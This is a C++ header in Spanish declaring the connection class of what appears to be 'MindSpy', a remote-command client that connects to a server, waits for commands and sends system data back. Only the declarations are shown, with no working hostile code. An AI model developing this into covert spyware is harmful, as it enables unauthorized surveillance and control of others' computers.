#pragma once
#include <windows.h>
#include <string>
#include <sstream>
#include <cstdio>
#include <Iphlpapi.h>
#include "Sistema.h"
#include "Datos.h"
#include "FileSystem.h"
// tamaño de buffer maximo
#define MAX_BUFFER 4096
// Comandos disponibles
#define CANTIDAD_COMANDOS 4
// Constante para comandos no validos
#define COMANDO_NO_EXISTENTE -1
// Version del cliente. Enviada al servidor
#define VERSION_CLIENTE "MindSpy 1.0 - (Alpha, Pre-Release)"

using namespace std;

namespace MindSpy
{
	// Métodos de conexión y comunicación con el servidor
	class Conector {
	private:
		// Data del socket
		WSADATA wsd;
		// Socket del cliente
		SOCKET sckt;
		// Información del servidor
		sockaddr_in server;
		// Información de sistema
		Sistema sys;
		// Estatus de la conexión
		bool Conectado;
		// Mensaje del server
		char msg[MAX_BUFFER];
		/*
		*	Nombre: Escuchar
		*	Parámetros: Ninguno
		*	Función: Ciclo de escucha del cliente. Procesa mensajes
		*	Retorno: Ninguno
		*/
		void Escuchar();

		/*
		*	Nombre: HiloProc
		*	Parámetros: 
		*		-LPARAM l: Párámetro que contiene un puntero a la clase Conector.
		*	Función: Correrá en un hilo nuevo. Llama a la función Escuchar.
		*	Retorno: unsigned long int, Siempre devuelve TRUE.
		*/
		static DWORD WINAPI HiloProc(LPARAM l)
		{
			Conector *c = (Conector*)l;
			c->Escuchar();
			return TRUE;
		}

		/*
		*	Nombre: TipoComando
		*	Parámetros: 
				-char* c: Texto del comando a buscar
		*	Función: Recorre la lista de comandos en busca de "c" para obtener su ID.
		*	Retorno: int. Si la función tiene éxito, devuelve el ID del comando. Sino, devuelve COMANDO_NO_EXISTENTE
		*/
		int TipoComando(const char*c);

	public:
		/*
		*	Nombre: Conector (Constructor)
		*	Parámetros: 
				- string IP: Dirección IP del servidor a conectarse
				- UINT32 Puerto: Número de puerto de escucha del servidor
		*	Función: Inicializa y conecta el cliente al servidor.
		*	Retorno: Ninguno
		*/
		Conector();
		
		/*
		*	Nombre: ~Conector (Destructor)
		*	Parámetros: Ninguno
		*	Función: Libera el socket y memoria dinámica reservada
		*	Retorno: Ninguno
		*/
		~Conector();

		/*
		*	Nombre: Listo
		*	Parámetros: Ninguno
		*	Función: Indica si el cliente está conectado
		*	Retorno: bool. Devuelve true si el cliente está conectado. false en caso contrario.
		*/
		bool Listo();

		/*
		*	Nombre: EnviarComando
		*	Parámetros: 
				-USHORT SizeofData: Tamaño de la data a enviar
				-USHORT comando: Número del comando a enviar
				-BYTE* Data: Puntero a la data que se enviará. Este puntero puede ser a cualquier estructura
							 de datos compatible.
		*	Función: Envia un comando, junto con su data, al servidor
		*	Retorno: bool. Devuelve true si el mensaje se envió. False en caso contrario.
		*/
		bool EnviarComando(UINT32 SizeofData, UINT32 comando, BYTE* Data);
	};
}
